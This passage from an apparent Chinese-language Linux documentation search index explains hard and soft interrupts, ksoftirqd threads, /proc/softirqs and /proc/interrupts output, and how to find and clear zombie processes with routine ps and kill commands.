\u800c\u4e0b\u534a\u90e8\u88ab\u8f6f\u4e2d\u65ad\u4fe1\u53f7\u5524\u9192\u540e\uff0c\u9700\u8981\u4ece\u5185\u5b58\u4e2d\u627e\u5230\u7f51\u7edc\u6570\u636e\uff0c\u518d\u6309\u7167\u7f51\u7edc\u534f\u8bae\u6808\uff0c\u5bf9\u6570\u636e\u8fdb\u884c\u9010\u5c42\u89e3\u6790\u548c\u5904\u7406\uff0c\u76f4\u5230\u628a\u5b83\u9001\u7ed9\u5e94\u7528\u7a0b\u5e8f\u3002 \u6240\u4ee5\uff0c\u8fd9\u4e24\u4e2a\u9636\u6bb5\u4f60\u4e5f\u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff1a \u4e0a\u534a\u90e8\u76f4\u63a5\u5904\u7406\u786c\u4ef6\u8bf7\u6c42\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u786c\u4e2d\u65ad\uff0c\u7279\u70b9\u662f\u5feb\u901f\u6267\u884c\uff1b \u4e0b\u534a\u90e8\u5219\u662f\u7531\u5185\u6838\u89e6\u53d1\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u8f6f\u4e2d\u65ad\uff0c\u7279\u70b9\u662f\u5ef6\u8fdf\u6267\u884c\u3002 \u5b9e\u9645\u4e0a\uff0c\u4e0a\u534a\u90e8\u4f1a\u6253\u65ad CPU \u6b63\u5728\u6267\u884c\u7684\u4efb\u52a1\uff0c\u7136\u540e\u7acb\u5373\u6267\u884c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u3002\u800c\u4e0b\u534a\u90e8\u4ee5\u5185\u6838\u7ebf\u7a0b\u7684\u65b9\u5f0f\u6267\u884c\uff0c\u5e76\u4e14\u6bcf\u4e2a CPU \u90fd\u5bf9\u5e94\u4e00\u4e2a\u8f6f\u4e2d\u65ad\u5185\u6838\u7ebf\u7a0b\uff0c\u540d\u5b57\u4e3a \u201cksoftirqd/CPU \u7f16\u53f7\u201d\uff0c\u6bd4\u5982\u8bf4\uff0c 0 \u53f7 CPU \u5bf9\u5e94\u7684\u8f6f\u4e2d\u65ad\u5185\u6838\u7ebf\u7a0b\u7684\u540d\u5b57\u5c31\u662f ksoftirqd/0\u3002 $ ps -ef | grep ksoft root 6 2 0 Mar21 ? 00:00:02 [ksoftirqd/0] root 14 2 0 Mar21 ? 00:00:01 [ksoftirqd/1] \u4e0d\u8fc7\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8f6f\u4e2d\u65ad\u4e0d\u53ea\u5305\u62ec\u4e86\u521a\u521a\u6240\u8bb2\u7684\u786c\u4ef6\u8bbe\u5907\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u7684\u4e0b\u534a\u90e8\uff0c\u4e00\u4e9b\u5185\u6838\u81ea\u5b9a\u4e49\u7684\u4e8b\u4ef6\u4e5f\u5c5e\u4e8e\u8f6f\u4e2d\u65ad\uff0c\u6bd4\u5982\u5185\u6838\u8c03\u5ea6\u548c RCU \u9501\uff08Read-Copy Update \u7684\u7f29\u5199\uff0cRCU \u662f Linux \u5185\u6838\u4e2d\u6700\u5e38\u7528\u7684\u9501\u4e4b\u4e00\uff09\u7b49\u3002 \u67e5\u770b\u8f6f\u4e2d\u65ad\u548c\u5185\u6838\u7ebf\u7a0b /proc/softirqs \u63d0\u4f9b\u4e86\u8f6f\u4e2d\u65ad\u7684\u8fd0\u884c\u60c5\u51b5 /proc/interrupts \u63d0\u4f9b\u4e86\u786c\u4e2d\u65ad\u7684\u8fd0\u884c\u60c5\u51b5 \u8f6f\u4e2d\u65ad $ cat /proc/softirqs CPU0 CPU1 HI: 0 0 TIMER: 811613 1972736 NET_TX: 49 7 NET_RX: 1136736 1506885 BLOCK: 0 0 IRQ_POLL: 0 0 TASKLET: 304787 3691 SCHED: 689718 1897539 HRTIMER: 0 0 RCU: 1330771 1354737 TIMER\uff08\u5b9a\u65f6\u4e2d\u65ad\uff09\u3001NET_RX\uff08\u7f51\u7edc\u63a5\u6536\uff09\u3001SCHED\uff08\u5185\u6838\u8c03\u5ea6\uff09\u3001RCU\uff08RCU \u9501\uff09\u3001HRTIMER\uff08\u9ad8\u7cbe\u5ea6\u5b9a\u65f6\u4e2d\u65ad\uff09 Linux\u5bf9\u5e94\u4ee3\u7801\uff1ahttps://github.com/torvalds/linux/blob/master/kernel/softirq.c \u7b2c\u4e00\uff0c\u8981\u6ce8\u610f\u8f6f\u4e2d\u65ad\u7684\u7c7b\u578b\uff0c\u4e5f\u5c31\u662f\u8fd9\u4e2a\u754c\u9762\u4e2d\u7b2c\u4e00\u5217\u7684\u5185\u5bb9\u3002\u4ece\u7b2c\u4e00\u5217\u4f60\u53ef\u4ee5\u770b\u5230\uff0c\u8f6f\u4e2d\u65ad\u5305\u62ec\u4e86 10 \u4e2a\u7c7b\u522b\uff0c\u5206\u522b\u5bf9\u5e94\u4e0d\u540c\u7684\u5de5\u4f5c\u7c7b\u578b\u3002\u6bd4\u5982 NET_RX \u8868\u793a\u7f51\u7edc\u63a5\u6536\u4e2d\u65ad\uff0c\u800c NET_TX \u8868\u793a\u7f51\u7edc\u53d1\u9001\u4e2d\u65ad\u3002 \u7b2c\u4e8c\uff0c\u8981\u6ce8\u610f\u540c\u4e00\u79cd\u8f6f\u4e2d\u65ad\u5728\u4e0d\u540c CPU \u4e0a\u7684\u5206\u5e03\u60c5\u51b5\uff0c\u4e5f\u5c31\u662f\u540c\u4e00\u884c\u7684\u5185\u5bb9\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u540c\u4e00\u79cd\u4e2d\u65ad\u5728\u4e0d\u540c CPU \u4e0a\u7684\u7d2f\u79ef\u6b21\u6570\u5e94\u8be5\u5dee\u4e0d\u591a\u3002\u6bd4\u5982\u8fd9\u4e2a\u754c\u9762\u4e2d\uff0cNET_RX \u5728 CPU0 \u548c CPU1 \u4e0a\u7684\u4e2d\u65ad\u6b21\u6570\u57fa\u672c\u662f\u540c\u4e00\u4e2a\u6570\u91cf\u7ea7\uff0c\u76f8\u5dee\u4e0d\u5927\u3002\u4e0d\u8fc7\u4f60\u53ef\u80fd\u53d1\u73b0\uff0cTASKLET \u5728\u4e0d\u540c CPU \u4e0a\u7684\u5206\u5e03\u5e76\u4e0d\u5747\u5300\u3002TASKLET \u662f\u6700\u5e38\u7528\u7684\u8f6f\u4e2d\u65ad\u5b9e\u73b0\u673a\u5236\uff0c\u6bcf\u4e2a TASKLET \u53ea\u8fd0\u884c\u4e00\u6b21\u5c31\u4f1a\u7ed3\u675f \uff0c\u5e76\u4e14\u53ea\u5728\u8c03\u7528\u5b83\u7684\u51fd\u6570\u6240\u5728\u7684 CPU \u4e0a\u8fd0\u884c\u3002\u56e0\u6b64\uff0c\u4f7f\u7528 TASKLET \u7279\u522b\u7b80\u4fbf\uff0c\u5f53\u7136\u4e5f\u4f1a\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0c\u6bd4\u5982\u8bf4\u7531\u4e8e\u53ea\u5728\u4e00\u4e2a CPU \u4e0a\u8fd0\u884c\u5bfc\u81f4\u7684\u8c03\u5ea6\u4e0d\u5747\u8861\uff0c\u518d\u6bd4\u5982\u56e0\u4e3a\u4e0d\u80fd\u5728\u591a\u4e2a CPU \u4e0a\u5e76\u884c\u8fd0\u884c\u5e26\u6765\u4e86\u6027\u80fd\u9650\u5236\u3002 \u786c\u4e2d\u65ad $ cat /proc/interrupts CPU0 CPU1 CPU2 CPU3 0: 88 0 0 0 IO-APIC-edge timer 1: 10 0 0 0 IO-APIC-edge i8042 4: 387 0 0 0 IO-APIC-edge serial 6: 3 0 0 0 IO-APIC-edge floppy 8: 0 0 0 0 IO-APIC-edge rtc0 9: 0 0 0 0 IO-APIC-fasteoi acpi 11: 0 0 0 0 IO-APIC-fasteoi uhci_hcd:usb1, virtio3 12: 15 0 0 0 IO-APIC-edge i8042 14: 5740446 0 0 0 IO-APIC-edge ata_piix 15: 0 0 0 0 IO-APIC-edge ata_piix 24: 0 0 0 0 PCI-MSI-edge virtio1-config 25: 3500134 0 0 0 PCI-MSI-edge virtio1-req.0 26: 10 0 0 0 PCI-MSI-edge virtio0-config 27: 5247204 0 0 0 PCI-MSI-edge virtio0-input.0 28: 1 0 0 0 PCI-MSI-edge virtio0-output.0 29: 1 1418195 0 0 PCI-MSI-edge virtio0-input.1 30: 1 0 0 0 PCI-MSI-edge virtio0-output.1 31: 0 0 0 0 PCI-MSI-edge virtio2-config 32: 343 0 0 0 PCI-MSI-edge virtio2-req.0 NMI: 0 0 0 0 Non-maskable interrupts LOC: 2042612769 2050632044 2142235299 2060435236 Local timer interrupts SPU: 0 0 0 0 Spurious interrupts PMI: 0 0 0 0 Performance monitoring interrupts IWI: 2348982 2289698 2460465 2782274 IRQ work interrupts RTR: 0 0 0 0 APIC ICR read retries RES: 230140174 230306549 226814157 234389987 Rescheduling interrupts CAL: 227698 879972 2463898 2574255 Function call interrupts TLB: 3165491 3151019 3106008 3074399 TLB shootdowns TRM: 0 0 0 0 Thermal event interrupts THR: 0 0 0 0 Threshold APIC interrupts DFR: 0 0 0 0 Deferred Error APIC interrupts MCE: 0 0 0 0 Machine check exceptions MCP: 19593 19593 19593 19593 Machine check polls ERR: 0 MIS: 0 PIN: 0 0 0 0 Posted-interrupt notification event NPI: 0 0 0 0 Nested posted-interrupt event PIW: 0 0 0 0 Posted-interrupt wakeup event /proc/interrupts \u4f9d\u6b21\u663e\u793airq\u7f16\u53f7\uff0c\u6bcf\u4e2acpu\u5bf9\u8be5irq\u7684\u5904\u7406\u6b21\u6570\uff0c\u4e2d\u65ad\u63a7\u5236\u5668\u7684\u540d\u5b57\uff0cirq\u7684\u540d\u5b57\uff0c\u4ee5\u53ca\u9a71\u52a8\u7a0b\u5e8f\u6ce8\u518c\u8be5irq\u65f6\u4f7f\u7528\u7684\u540d\u5b57 /proc/irq\u76ee\u5f55\u4e0b\u9762\u4f1a\u4e3a\u6bcf\u4e2a\u6ce8\u518c\u7684irq\u521b\u5efa\u4e00\u4e2a\u4ee5irq\u7f16\u53f7\u4e3a\u540d\u5b57\u7684\u5b50\u76ee\u5f55\uff0c\u6bcf\u4e2a\u5b50\u76ee\u5f55\u4e0b\u5206\u522b\u6709\u4ee5\u4e0b\u6761\u76ee\uff1a smp_affinity irq\u548ccpu\u4e4b\u95f4\u7684\u4eb2\u7f18\u7ed1\u5b9a\u5173\u7cfb smp_affinity_hint \u53ea\u8bfb\u6761\u76ee\uff0c\u7528\u4e8e\u7528\u6237\u7a7a\u95f4\u505airq\u5e73\u8861\u53ea\u7528 spurious \u53ef\u4ee5\u83b7\u5f97\u8be5irq\u88ab\u5904\u7406\u548c\u672a\u88ab\u5904\u7406\u7684\u6b21\u6570\u7684\u7edf\u8ba1\u4fe1\u606f handler_name \u9a71\u52a8\u7a0b\u5e8f\u6ce8\u518c\u8be5irq\u65f6\u4f20\u5165\u7684\u5904\u7406\u7a0b\u5e8f\u7684\u540d\u5b57","title":"\u4e2d\u65ad"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E4%B8%AD%E6%96%AD/#linux","text":"Linux \u5c06\u4e2d\u65ad\u5904\u7406\u8fc7\u7a0b\u5206\u6210\u4e86\u4e24\u4e2a\u9636\u6bb5\uff0c\u4e5f\u5c31\u662f\u4e0a\u534a\u90e8\u548c\u4e0b\u534a\u90e8\uff1a \u4e0a\u534a\u90e8\u7528\u6765\u5feb\u901f\u5904\u7406\u4e2d\u65ad\uff0c\u5b83\u5728\u4e2d\u65ad\u7981\u6b62\u6a21\u5f0f\u4e0b\u8fd0\u884c\uff0c\u4e3b\u8981\u5904\u7406\u8ddf\u786c\u4ef6\u7d27\u5bc6\u76f8\u5173\u7684\u6216\u65f6\u95f4\u654f\u611f\u7684\u5de5\u4f5c\u3002 \u4e0b\u534a\u90e8\u7528\u6765\u5ef6\u8fdf\u5904\u7406\u4e0a\u534a\u90e8\u672a\u5b8c\u6210\u7684\u5de5\u4f5c\uff0c\u901a\u5e38\u4ee5\u5185\u6838\u7ebf\u7a0b\u7684\u65b9\u5f0f\u8fd0\u884c\u3002 \u7f51\u5361\u63a5\u6536\u5230\u6570\u636e\u5305\u540e\uff0c\u4f1a\u901a\u8fc7\u786c\u4ef6\u4e2d\u65ad\u7684\u65b9\u5f0f\uff0c\u901a\u77e5\u5185\u6838\u6709\u65b0\u7684\u6570\u636e\u5230\u4e86\u3002\u8fd9\u65f6\uff0c\u5185\u6838\u5c31\u5e94\u8be5\u8c03\u7528\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u6765\u54cd\u5e94\u5b83\u3002 \u5bf9\u4e0a\u534a\u90e8\u6765\u8bf4\uff0c\u65e2\u7136\u662f\u5feb\u901f\u5904\u7406\uff0c\u5176\u5b9e\u5c31\u662f\u8981\u628a\u7f51\u5361\u7684\u6570\u636e\u8bfb\u5230\u5185\u5b58\u4e2d\uff0c\u7136\u540e\u66f4\u65b0\u4e00\u4e0b\u786c\u4ef6\u5bc4\u5b58\u5668\u7684\u72b6\u6001\uff08\u8868\u793a\u6570\u636e\u5df2\u7ecf\u8bfb\u597d\u4e86\uff09\uff0c\u6700\u540e\u518d\u53d1\u9001\u4e00\u4e2a\u8f6f\u4e2d\u65ad\u4fe1\u53f7\uff0c\u901a\u77e5\u4e0b\u534a\u90e8\u505a\u8fdb\u4e00\u6b65\u7684\u5904\u7406\u3002 \u800c\u4e0b\u534a\u90e8\u88ab\u8f6f\u4e2d\u65ad\u4fe1\u53f7\u5524\u9192\u540e\uff0c\u9700\u8981\u4ece\u5185\u5b58\u4e2d\u627e\u5230\u7f51\u7edc\u6570\u636e\uff0c\u518d\u6309\u7167\u7f51\u7edc\u534f\u8bae\u6808\uff0c\u5bf9\u6570\u636e\u8fdb\u884c\u9010\u5c42\u89e3\u6790\u548c\u5904\u7406\uff0c\u76f4\u5230\u628a\u5b83\u9001\u7ed9\u5e94\u7528\u7a0b\u5e8f\u3002 \u6240\u4ee5\uff0c\u8fd9\u4e24\u4e2a\u9636\u6bb5\u4f60\u4e5f\u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff1a \u4e0a\u534a\u90e8\u76f4\u63a5\u5904\u7406\u786c\u4ef6\u8bf7\u6c42\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u786c\u4e2d\u65ad\uff0c\u7279\u70b9\u662f\u5feb\u901f\u6267\u884c\uff1b \u4e0b\u534a\u90e8\u5219\u662f\u7531\u5185\u6838\u89e6\u53d1\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u8f6f\u4e2d\u65ad\uff0c\u7279\u70b9\u662f\u5ef6\u8fdf\u6267\u884c\u3002 \u5b9e\u9645\u4e0a\uff0c\u4e0a\u534a\u90e8\u4f1a\u6253\u65ad CPU \u6b63\u5728\u6267\u884c\u7684\u4efb\u52a1\uff0c\u7136\u540e\u7acb\u5373\u6267\u884c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u3002\u800c\u4e0b\u534a\u90e8\u4ee5\u5185\u6838\u7ebf\u7a0b\u7684\u65b9\u5f0f\u6267\u884c\uff0c\u5e76\u4e14\u6bcf\u4e2a CPU \u90fd\u5bf9\u5e94\u4e00\u4e2a\u8f6f\u4e2d\u65ad\u5185\u6838\u7ebf\u7a0b\uff0c\u540d\u5b57\u4e3a \u201cksoftirqd/CPU \u7f16\u53f7\u201d\uff0c\u6bd4\u5982\u8bf4\uff0c 0 \u53f7 CPU \u5bf9\u5e94\u7684\u8f6f\u4e2d\u65ad\u5185\u6838\u7ebf\u7a0b\u7684\u540d\u5b57\u5c31\u662f ksoftirqd/0\u3002 $ ps -ef | grep ksoft root 6 2 0 Mar21 ? 00:00:02 [ksoftirqd/0] root 14 2 0 Mar21 ? 00:00:01 [ksoftirqd/1] \u4e0d\u8fc7\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8f6f\u4e2d\u65ad\u4e0d\u53ea\u5305\u62ec\u4e86\u521a\u521a\u6240\u8bb2\u7684\u786c\u4ef6\u8bbe\u5907\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u7684\u4e0b\u534a\u90e8\uff0c\u4e00\u4e9b\u5185\u6838\u81ea\u5b9a\u4e49\u7684\u4e8b\u4ef6\u4e5f\u5c5e\u4e8e\u8f6f\u4e2d\u65ad\uff0c\u6bd4\u5982\u5185\u6838\u8c03\u5ea6\u548c RCU \u9501\uff08Read-Copy Update \u7684\u7f29\u5199\uff0cRCU \u662f Linux \u5185\u6838\u4e2d\u6700\u5e38\u7528\u7684\u9501\u4e4b\u4e00\uff09\u7b49\u3002","title":"Linux\u7684\u4e2d\u65ad"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E4%B8%AD%E6%96%AD/#_1","text":"/proc/softirqs \u63d0\u4f9b\u4e86\u8f6f\u4e2d\u65ad\u7684\u8fd0\u884c\u60c5\u51b5 /proc/interrupts \u63d0\u4f9b\u4e86\u786c\u4e2d\u65ad\u7684\u8fd0\u884c\u60c5\u51b5","title":"\u67e5\u770b\u8f6f\u4e2d\u65ad\u548c\u5185\u6838\u7ebf\u7a0b"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E4%B8%AD%E6%96%AD/#_2","text":"$ cat /proc/softirqs CPU0 CPU1 HI: 0 0 TIMER: 811613 1972736 NET_TX: 49 7 NET_RX: 1136736 1506885 BLOCK: 0 0 IRQ_POLL: 0 0 TASKLET: 304787 3691 SCHED: 689718 1897539 HRTIMER: 0 0 RCU: 1330771 1354737 TIMER\uff08\u5b9a\u65f6\u4e2d\u65ad\uff09\u3001NET_RX\uff08\u7f51\u7edc\u63a5\u6536\uff09\u3001SCHED\uff08\u5185\u6838\u8c03\u5ea6\uff09\u3001RCU\uff08RCU \u9501\uff09\u3001HRTIMER\uff08\u9ad8\u7cbe\u5ea6\u5b9a\u65f6\u4e2d\u65ad\uff09 Linux\u5bf9\u5e94\u4ee3\u7801\uff1ahttps://github.com/torvalds/linux/blob/master/kernel/softirq.c \u7b2c\u4e00\uff0c\u8981\u6ce8\u610f\u8f6f\u4e2d\u65ad\u7684\u7c7b\u578b\uff0c\u4e5f\u5c31\u662f\u8fd9\u4e2a\u754c\u9762\u4e2d\u7b2c\u4e00\u5217\u7684\u5185\u5bb9\u3002\u4ece\u7b2c\u4e00\u5217\u4f60\u53ef\u4ee5\u770b\u5230\uff0c\u8f6f\u4e2d\u65ad\u5305\u62ec\u4e86 10 \u4e2a\u7c7b\u522b\uff0c\u5206\u522b\u5bf9\u5e94\u4e0d\u540c\u7684\u5de5\u4f5c\u7c7b\u578b\u3002\u6bd4\u5982 NET_RX \u8868\u793a\u7f51\u7edc\u63a5\u6536\u4e2d\u65ad\uff0c\u800c NET_TX \u8868\u793a\u7f51\u7edc\u53d1\u9001\u4e2d\u65ad\u3002 \u7b2c\u4e8c\uff0c\u8981\u6ce8\u610f\u540c\u4e00\u79cd\u8f6f\u4e2d\u65ad\u5728\u4e0d\u540c CPU \u4e0a\u7684\u5206\u5e03\u60c5\u51b5\uff0c\u4e5f\u5c31\u662f\u540c\u4e00\u884c\u7684\u5185\u5bb9\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u540c\u4e00\u79cd\u4e2d\u65ad\u5728\u4e0d\u540c CPU \u4e0a\u7684\u7d2f\u79ef\u6b21\u6570\u5e94\u8be5\u5dee\u4e0d\u591a\u3002\u6bd4\u5982\u8fd9\u4e2a\u754c\u9762\u4e2d\uff0cNET_RX \u5728 CPU0 \u548c CPU1 \u4e0a\u7684\u4e2d\u65ad\u6b21\u6570\u57fa\u672c\u662f\u540c\u4e00\u4e2a\u6570\u91cf\u7ea7\uff0c\u76f8\u5dee\u4e0d\u5927\u3002\u4e0d\u8fc7\u4f60\u53ef\u80fd\u53d1\u73b0\uff0cTASKLET \u5728\u4e0d\u540c CPU \u4e0a\u7684\u5206\u5e03\u5e76\u4e0d\u5747\u5300\u3002TASKLET \u662f\u6700\u5e38\u7528\u7684\u8f6f\u4e2d\u65ad\u5b9e\u73b0\u673a\u5236\uff0c\u6bcf\u4e2a TASKLET \u53ea\u8fd0\u884c\u4e00\u6b21\u5c31\u4f1a\u7ed3\u675f \uff0c\u5e76\u4e14\u53ea\u5728\u8c03\u7528\u5b83\u7684\u51fd\u6570\u6240\u5728\u7684 CPU \u4e0a\u8fd0\u884c\u3002\u56e0\u6b64\uff0c\u4f7f\u7528 TASKLET \u7279\u522b\u7b80\u4fbf\uff0c\u5f53\u7136\u4e5f\u4f1a\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0c\u6bd4\u5982\u8bf4\u7531\u4e8e\u53ea\u5728\u4e00\u4e2a CPU \u4e0a\u8fd0\u884c\u5bfc\u81f4\u7684\u8c03\u5ea6\u4e0d\u5747\u8861\uff0c\u518d\u6bd4\u5982\u56e0\u4e3a\u4e0d\u80fd\u5728\u591a\u4e2a CPU \u4e0a\u5e76\u884c\u8fd0\u884c\u5e26\u6765\u4e86\u6027\u80fd\u9650\u5236\u3002","title":"\u8f6f\u4e2d\u65ad"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E4%B8%AD%E6%96%AD/#_3","text":"$ cat /proc/interrupts CPU0 CPU1 CPU2 CPU3 0: 88 0 0 0 IO-APIC-edge timer 1: 10 0 0 0 IO-APIC-edge i8042 4: 387 0 0 0 IO-APIC-edge serial 6: 3 0 0 0 IO-APIC-edge floppy 8: 0 0 0 0 IO-APIC-edge rtc0 9: 0 0 0 0 IO-APIC-fasteoi acpi 11: 0 0 0 0 IO-APIC-fasteoi uhci_hcd:usb1, virtio3 12: 15 0 0 0 IO-APIC-edge i8042 14: 5740446 0 0 0 IO-APIC-edge ata_piix 15: 0 0 0 0 IO-APIC-edge ata_piix 24: 0 0 0 0 PCI-MSI-edge virtio1-config 25: 3500134 0 0 0 PCI-MSI-edge virtio1-req.0 26: 10 0 0 0 PCI-MSI-edge virtio0-config 27: 5247204 0 0 0 PCI-MSI-edge virtio0-input.0 28: 1 0 0 0 PCI-MSI-edge virtio0-output.0 29: 1 1418195 0 0 PCI-MSI-edge virtio0-input.1 30: 1 0 0 0 PCI-MSI-edge virtio0-output.1 31: 0 0 0 0 PCI-MSI-edge virtio2-config 32: 343 0 0 0 PCI-MSI-edge virtio2-req.0 NMI: 0 0 0 0 Non-maskable interrupts LOC: 2042612769 2050632044 2142235299 2060435236 Local timer interrupts SPU: 0 0 0 0 Spurious interrupts PMI: 0 0 0 0 Performance monitoring interrupts IWI: 2348982 2289698 2460465 2782274 IRQ work interrupts RTR: 0 0 0 0 APIC ICR read retries RES: 230140174 230306549 226814157 234389987 Rescheduling interrupts CAL: 227698 879972 2463898 2574255 Function call interrupts TLB: 3165491 3151019 3106008 3074399 TLB shootdowns TRM: 0 0 0 0 Thermal event interrupts THR: 0 0 0 0 Threshold APIC interrupts DFR: 0 0 0 0 Deferred Error APIC interrupts MCE: 0 0 0 0 Machine check exceptions MCP: 19593 19593 19593 19593 Machine check polls ERR: 0 MIS: 0 PIN: 0 0 0 0 Posted-interrupt notification event NPI: 0 0 0 0 Nested posted-interrupt event PIW: 0 0 0 0 Posted-interrupt wakeup event /proc/interrupts \u4f9d\u6b21\u663e\u793airq\u7f16\u53f7\uff0c\u6bcf\u4e2acpu\u5bf9\u8be5irq\u7684\u5904\u7406\u6b21\u6570\uff0c\u4e2d\u65ad\u63a7\u5236\u5668\u7684\u540d\u5b57\uff0cirq\u7684\u540d\u5b57\uff0c\u4ee5\u53ca\u9a71\u52a8\u7a0b\u5e8f\u6ce8\u518c\u8be5irq\u65f6\u4f7f\u7528\u7684\u540d\u5b57 /proc/irq\u76ee\u5f55\u4e0b\u9762\u4f1a\u4e3a\u6bcf\u4e2a\u6ce8\u518c\u7684irq\u521b\u5efa\u4e00\u4e2a\u4ee5irq\u7f16\u53f7\u4e3a\u540d\u5b57\u7684\u5b50\u76ee\u5f55\uff0c\u6bcf\u4e2a\u5b50\u76ee\u5f55\u4e0b\u5206\u522b\u6709\u4ee5\u4e0b\u6761\u76ee\uff1a smp_affinity irq\u548ccpu\u4e4b\u95f4\u7684\u4eb2\u7f18\u7ed1\u5b9a\u5173\u7cfb smp_affinity_hint \u53ea\u8bfb\u6761\u76ee\uff0c\u7528\u4e8e\u7528\u6237\u7a7a\u95f4\u505airq\u5e73\u8861\u53ea\u7528 spurious \u53ef\u4ee5\u83b7\u5f97\u8be5irq\u88ab\u5904\u7406\u548c\u672a\u88ab\u5904\u7406\u7684\u6b21\u6570\u7684\u7edf\u8ba1\u4fe1\u606f handler_name \u9a71\u52a8\u7a0b\u5e8f\u6ce8\u518c\u8be5irq\u65f6\u4f20\u5165\u7684\u5904\u7406\u7a0b\u5e8f\u7684\u540d\u5b57","title":"\u786c\u4e2d\u65ad"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B/","text":"\u50f5\u5c38\u8fdb\u7a0b \u4ea7\u751f\u539f\u56e0 \u50f5\u5c38\u8fdb\u7a0b\uff0c\u8fd9\u662f\u591a\u8fdb\u7a0b\u5e94\u7528\u5f88\u5bb9\u6613\u78b0\u5230\u7684\u95ee\u9898\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u521b\u5efa\u4e86\u5b50\u8fdb\u7a0b\u540e\uff0c\u5b83\u5e94\u8be5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528 wait() \u6216\u8005 waitpid() \u7b49\u5f85\u5b50\u8fdb\u7a0b\u7ed3\u675f\uff0c\u56de\u6536\u5b50\u8fdb\u7a0b\u7684\u8d44\u6e90\uff1b\u800c\u5b50\u8fdb\u7a0b\u5728\u7ed3\u675f\u65f6\uff0c\u4f1a\u5411\u5b83\u7684\u7236\u8fdb\u7a0b\u53d1\u9001 SIGCHLD \u4fe1\u53f7\uff0c\u6240\u4ee5\uff0c\u7236\u8fdb\u7a0b\u8fd8\u53ef\u4ee5\u6ce8\u518c SIGCHLD \u4fe1\u53f7\u7684\u5904\u7406\u51fd\u6570\uff0c\u5f02\u6b65\u56de\u6536\u8d44\u6e90\u3002\u5982\u679c\u7236\u8fdb\u7a0b\u6ca1\u8fd9\u4e48\u505a\uff0c\u6216\u662f\u5b50\u8fdb\u7a0b\u6267\u884c\u592a\u5feb\uff0c\u7236\u8fdb\u7a0b\u8fd8\u6ca1\u6765\u5f97\u53ca\u5904\u7406\u5b50\u8fdb\u7a0b\u72b6\u6001\uff0c\u5b50\u8fdb\u7a0b\u5c31\u5df2\u7ecf\u63d0\u524d\u9000\u51fa\uff0c\u90a3\u8fd9\u65f6\u7684\u5b50\u8fdb\u7a0b\u5c31\u4f1a\u53d8\u6210\u50f5\u5c38\u8fdb\u7a0b\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u7236\u4eb2\u5e94\u8be5\u4e00\u76f4\u5bf9\u513f\u5b50\u8d1f\u8d23\uff0c\u5584\u59cb\u5584\u7ec8\uff0c\u5982\u679c\u4e0d\u4f5c\u4e3a\u6216\u8005\u8ddf\u4e0d\u4e0a\uff0c\u90fd\u4f1a\u5bfc\u81f4\u201c\u95ee\u9898\u5c11\u5e74\u201d\u7684\u51fa\u73b0\u3002 \u50f5\u5c38\u8fdb\u7a0b\u7684\u5f71\u54cd \u4e00\u65e6\u7236\u8fdb\u7a0b\u6ca1\u6709\u5904\u7406\u5b50\u8fdb\u7a0b\u7684\u7ec8\u6b62\uff0c\u8fd8\u4e00\u76f4\u4fdd\u6301\u8fd0\u884c\u72b6\u6001\uff0c\u90a3\u4e48\u5b50\u8fdb\u7a0b\u5c31\u4f1a\u4e00\u76f4\u5904\u4e8e\u50f5\u5c38\u72b6\u6001\u3002\u5927\u91cf\u7684\u50f5\u5c38\u8fdb\u7a0b\u4f1a\u7528\u5c3d PID \u8fdb\u7a0b\u53f7\uff0c\u5bfc\u81f4\u65b0\u8fdb\u7a0b\u4e0d\u80fd\u521b\u5efa\uff0c\u6240\u4ee5\u8fd9\u79cd\u60c5\u51b5\u4e00\u5b9a\u8981\u907f\u514d\u3002 \u67e5\u627e\u50f5\u5c38\u8fdb\u7a0b\u7684\u547d\u4ee4 $ ps aux | grep Z #\u6216\u8005 $ ps -ef | grep defunct | grep -v grep \u5982\u4f55\u5904\u7406\u50f5\u5c38\u8fdb\u7a0b \u4fe1\u53f7\u6765\u6740\u6b7b\u8fdb\u7a0b\uff0c\u4f46\u662f\u50f5\u5c38\u8fdb\u7a0b\u5df2\u7ecf\u6b7b\u4e86\uff0c \u4f60\u4e0d\u80fd\u6740\u6b7b\u5df2\u7ecf\u6b7b\u6389\u7684\u4e1c\u897f\u3002 \u56e0\u6b64\u4f60\u9700\u8981\u8f93\u5165\u7684\u547d\u4ee4\u5e94\u8be5\u662f kill -s SIGCHLD pid # \u5c06\u8fd9\u91cc\u7684 pid \u66ff\u6362\u6210\u7236\u8fdb\u7a0b\u7684\u8fdb\u7a0b id\uff0c\u8fd9\u6837\u7236\u8fdb\u7a0b\u5c31\u4f1a\u5220\u9664\u6240\u6709\u4ee5\u53ca\u5b8c\u6210\u5e76\u6b7b\u6389\u7684\u5b50\u8fdb\u7a0b\u4e86\u3002\u6709\u65f6\u8fd9\u6837\u662f\u5220\u9664\u4e0d\u6389\u50f5\u5c38\u8fdb\u7a0b \u50f5\u5c38\u8fdb\u7a0b\u7684\u4ea7\u751f\u662f\u56e0\u4e3a\u7236\u8fdb\u7a0b\u6ca1\u6709 wait() 